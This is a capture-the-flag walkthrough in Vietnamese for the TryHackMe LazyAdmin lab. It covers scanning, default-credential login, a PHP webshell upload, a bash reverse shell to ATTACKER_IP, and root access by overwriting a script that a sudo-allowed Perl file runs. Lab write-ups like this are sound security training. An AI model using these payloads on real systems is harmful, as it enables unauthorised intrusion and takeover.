## TryHackMe LazyAdmin Write-up

---

## 1. Reconnaissance (Dò quét thông tin)

**Step 1:** Nmap scan để check các port mở.

```bash
nmap -sC -sV -oN nmap_scan 10.10.10.10
```

Output cho thấy:

* Port 22 → SSH
* Port 80 → Web server (Apache)

*(Tóm lại: có web, có SSH → chắc chắn có trò hay ho 😏)*

---

## 2. Enumeration (Tìm thêm thông tin)

**Step 2:** Mở web ở port 80 → thấy trang bình thường.

Dùng `dirsearch` để brute force thư mục:

```bash
python3 dirsearch.py -u http://10.10.10.10 -e php,txt,html
```

Kết quả: tìm được `/content/as/` → chính là Adminer panel.

*(Nghĩa là web có CMS dỏm, dễ bị dính lỗi)*

---

## 3. Exploitation (Khai thác)

Trong thư mục `/content/as/` tìm thấy login page.
Thử credential mặc định → **admin\:password** (classic luôn 😅) → login thành công.

Trong dashboard có chức năng upload → nhưng check thì nó bị giới hạn.
Tuy nhiên, để ý có chỗ **archive function** → có thể chèn file `.php`.

**Payload reverse shell**:

```bash
echo "<?php system($_GET['cmd']); ?>" > shell.php
```

Rồi upload → truy cập `/content/as/shell.php?cmd=id` để test.

Khi ok thì tạo reverse shell:

```bash
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
```

Listener:

```bash
nc -lvnp 4444
```

Boom 💥 → Shell vào được user **www-data**.

---

## 4. Privilege Escalation (Leo quyền)

**Step 1:** Lục `/home` → có user `itguy`.
Check file → thấy `backup.pl`.

**Step 2:** Chạy `sudo -l` với user `www-data`:

```bash
sudo -l
```

Kết quả:
`(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl`

*(Tức là mình có thể chạy file Perl đó với quyền root mà không cần pass 😏)*

**Step 3:** Check `backup.pl`:

```perl
#!/usr/bin/perl
system("sh", "/etc/copy.sh");
```

File gọi `/etc/copy.sh` → mình có thể chỉnh file đó để chèn reverse shell hoặc thêm root user.

Ví dụ exploit:

```bash
echo '/bin/bash' > /etc/copy.sh
chmod +x /etc/copy.sh
```

Rồi chạy:

```bash
sudo /usr/bin/perl /home/itguy/backup.pl
```

\=> Root shell 🎉

---

## 5. Loot (Thu hoạch)

* Lấy flag user trong `/home/itguy/user.txt`
* Lấy flag root trong `/root/root.txt`

Done ✅ → pwned LazyAdmin!

*(Quá trình: scan → dirsearch → default creds → webshell → privilege escalation → root. Ngon lành cành đào 🍑)*
